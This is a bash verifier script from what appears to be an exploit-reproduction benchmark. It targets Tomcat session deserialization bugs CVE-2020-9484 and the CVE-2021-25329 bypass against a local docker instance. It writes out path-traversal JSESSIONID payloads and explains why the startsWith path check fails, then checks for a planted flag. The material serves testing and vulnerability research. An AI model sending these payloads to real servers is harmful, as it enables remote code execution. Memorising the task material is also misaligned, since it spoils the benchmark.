#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0 = PCB_FLAG written by BenignMarker.readObject appears in GET /marker.jsp
# 10 = blocked / not observed; 20 = env; 30 = usage
#
# seed:     Cookie JSESSIONID=../../../../tmp/payload          (CVE-2020-9484)
# residual: Cookie JSESSIONID=../sessions-extra/payload        (CVE-2021-25329)
# Residual is an inline literal. Never original_poc, never heldout, never seed fallback.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

SVC="$VERSION"
PORT=""
for _ in $(seq 1 30); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
    port "$SVC" 8080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -z "$PORT" ]]; then
    CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
      ps -q "$SVC" 2>/dev/null | head -1)"
    if [[ -n "$CID" ]]; then
      PORT="$(docker port "$CID" 8080 2>/dev/null | head -1 | sed 's/.*://' | tr -d '[:space:]')"
    fi
  fi
  if [[ -n "$PORT" ]]; then
    body="$(curl -sS --max-time 5 "http://127.0.0.1:${PORT}/" || true)"
    if printf '%s' "$body" | grep -q 'OK'; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
if [[ -z "$PORT" ]]; then
  echo "verify: no mapped port for $SVC:8080" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'jsessionid': '../../../../tmp/payload'}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
else
  # CVE-2021-25329: String.startsWith is not a path-component check.
  # Sibling dir /usr/local/tomcat/sessions-extra canonical-starts-with
  # /usr/local/tomcat/sessions. Inline literal only.
  printf '%s' '{"jsessionid":"../sessions-extra/payload"}' > "$WORK_DIR/cand.json"
fi

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
# Planted-at-start PCB_FLAG: judge RUN_FLAG so wrong/stale overrides do not self-match.
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
